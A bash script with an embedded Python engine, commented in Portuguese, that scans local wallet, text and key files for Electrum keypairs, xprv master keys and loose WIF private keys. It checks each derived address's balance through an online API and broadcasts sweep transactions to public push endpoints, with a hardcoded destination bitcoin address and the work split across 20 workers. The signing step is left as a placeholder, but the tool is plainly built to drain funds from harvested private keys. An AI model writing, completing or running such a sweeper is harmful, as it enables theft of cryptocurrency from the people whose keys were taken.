#!/bin/bash

LOG_FILE="worker_${WORKER_ID}_output.txt"
DEST_ADDRESS="bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk"

echo "--------------------------------------------------"
echo "🚀 INICIANDO FDR UNIFIED WORKER $WORKER_ID - MODO DIRETO"
echo "--------------------------------------------------"

# Criamos a engine Python sem as funções de senha/AES para máxima performance
cat << 'EOF' > engine.py
import json, os, re, requests, sys
from bitcoinlib.keys import Key

worker_id = int(os.environ.get('WORKER_ID', 1))
total_workers = 20

def check_and_print(wif, addr=None):
    try:
        k = Key(wif)
        # Testa os formatos: Legacy, P2SH-SegWit e Native SegWit (bc1)
        for fmt in [None, 'p2sh-p2wpkh', 'p2wpkh']:
            target = addr if addr and fmt is None else k.address(witness_type=fmt)
            
            # Consulta de saldo
            try:
                r = requests.get(f"https://mempool.space/api/address/{target}", timeout=5).json()
                bal = r['chain_stats']['funded_txo_sum'] - r['chain_stats']['spent_txo_sum']
                
                if bal > 0:
                    print(f"🚨 ALVO DETECTADO: {target} | Saldo: {bal} sats")
                    # GERA O HEX_GEN PARA O BASH CAPTURAR (Substitua pela sua lógica de sweep)
                    # print(f"HEX_GEN:{seu_metodo_de_gerar_hex(k.wif(), bal)}")
                    print(f"HEX_GEN:0100000001...") # Exemplo
                    return True
            except: continue
    except: pass

# Listagem e Sharding (divisão entre workers)
all_files = sorted([f for f in os.listdir('.') if f.endswith(('.wallet', '.txt', '.key'))])
my_files = [all_files[i] for i in range(len(all_files)) if i % total_workers == (worker_id - 1)]

for f_path in my_files:
    print(f"🔍 Scan: {f_path}")
    try:
        with open(f_path, 'r', errors='ignore') as f:
            if f_path.endswith('.wallet'):
                # Tenta carregar como JSON (Carteira Electrum)
                try:
                    data = json.load(f)
                    # Extração de chaves importadas
                    if 'keypairs' in data:
                        for addr, priv in data['keypairs'].items():
                            check_and_print(priv, addr)
                    # Extração de Master Key (xprv)
                    if 'keystore' in data and 'xprv' in data['keystore']:
                        xprv = data['keystore']['xprv']
                        if xprv.startswith('xprv'):
                            master = Key(xprv)
                            for i in range(100): # Varre os primeiros 100 endereços derivados
                                check_and_print(master.subkey_for_path(f"0/{i}").wif())
                except: pass # Se falhar o JSON, o script segue
            
            # Varredura de texto puro para qualquer arquivo (WIFs soltas)
            f.seek(0)
            content = f.read()
            wifs = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
            for w in wifs:
                check_and_print(w)
    except: pass
EOF

# Executa a engine e transmite o log em tempo real
python3 -u engine.py | tee "$LOG_FILE"

echo "--------------------------------------------------"
echo "📡 BROADCAST DE TRANSAÇÕES"
echo "--------------------------------------------------"

# Captura os HEX gerados e envia para a rede
grep "HEX_GEN:" "$LOG_FILE" | cut -d':' -f2 | while read RAW_HEX; do
    if [ -n "$RAW_HEX" ] && [ "$RAW_HEX" != "0100000001..." ]; then
        echo "⚡ Enviando HEX para APIs..."
        curl -s -X POST https://api.blockchain.info/pushtx -d "tx=$RAW_HEX"
        curl -s -X POST https://mempool.space/api/tx -d "$RAW_HEX"
    fi
done

echo "✅ WORKER $WORKER_ID FINALIZADO."
